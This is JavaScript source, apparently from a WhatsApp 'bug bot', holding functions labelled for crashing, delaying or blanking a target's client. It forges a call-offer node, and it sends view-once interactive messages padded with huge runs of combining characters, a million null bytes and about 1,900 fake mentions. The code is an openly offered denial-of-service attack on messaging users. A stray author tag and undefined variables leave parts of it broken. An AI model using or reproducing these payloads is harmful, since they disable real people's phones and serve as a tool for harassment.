// FUNCTION FC/CRASH
async function JustinXFCSendNodeCall(sock, target) {
    // get all devices associated with this number
    let devices = (
        await sock.getUSyncDevices([targetNumber], false, false)
    ).map(({ user, device }) => ${user}:${device || ''}@s.whatsapp.net);

    await sock.assertSessions(devices);

    // simple mutex lock for per-jid encryption
    let createMutex = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let mutexManager = createMutex();
🩸드림 가이 Justin:
let randomKey = crypto.randomBytes(32);
    let randomKeyWithFlag = Buffer.concat([randomKey, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await sock.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    // build call node (offer)
    let callNode = {
        tag: "call",
        attrs: {
            to: targetNumber,
            id: sock.generateMessageTag(),
            from: sock.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": sock.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };
    await sock.sendNode(lemiting);
 }
async function Crashui1(sock, target) {
  const ui1 = "ྦྷ".repeat(33333);
  const ui2 = "ྦྷ".repeat(33333);
  const ui3 = "ྦྷ".repeat(33333);
  const ui = ui1 + ui2 + ui3;  
  var msg = generateWAMessageFromContent(target, proto.Message.fromObject({
    "viewOnceMessage": {
      "message": {
        "interactiveMessage": {
          "locationMessage": {
            "degreesLatitude": "0",
            "degreesLongitude": "0"
          },
          "body": {
            "text": "woi"
          },
          "nativeFlowMessage": {
            "buttons": [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"${ui}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`
              }
            ]
          }
        }
      }
    }
  }), { userJid: target, quoted: kuwoted });  
  await sock.relayMessage(target, msg.message, { 
    participant: { 
      jid: target 
    }, 
    messageId: msg.key.id 
  });
}
//FUNCTION DELAY
async function delayinvisible(sock, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "salam kenal gw justin",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          }
        },
        contextInfo: {
          participant: { jid: target },
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

//FUNCTION BLANK
async function BlankSpam(sock, target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 3,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
          },
          interactiveMessage: {
            body: {
              text: "🩸justinoffc" + "ꦾ".repeat(120000) + "ꦽ".repeat(40000),
            },
            nativeFlowMessage: {
              buttons: [
          {
            name: "cta_url",
            buttonParamsJson: `{"display_text":"${"ꦽ".repeat(10000)}","url":"https:","merchant_url":"https:"}`
           },
           {
             name: "cta_reply",
             buttonParamsJson: `{"display_text":"${"ꦾ".repeat(10000)}","id":"🩸justinoffc"}`
           },
           { 
              name: "cta_copy",
              buttonParamsJson: `{"display_text":"${"ꦾ".repeat(10000)}","copy_code":"18.0.0"}`
           },
           {
            name: "cta_url",
            buttonParamsJson: `{"display_text":"${"ꦽ".repeat(10000)}","url":"https:","merchant_url":"https:"}`
           },
           {
             name: "cta_reply",
             buttonParamsJson: `{"display_text":"${"ꦾ".repeat(10000)}","id":"🩸justinoffc"}`
           },
           { 
              name: "cta_copy",
              buttonParamsJson: `{"display_text":"${"ꦾ".repeat(10000)}","copy_code":"23.0.0"}`
           }
           ]
            },
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
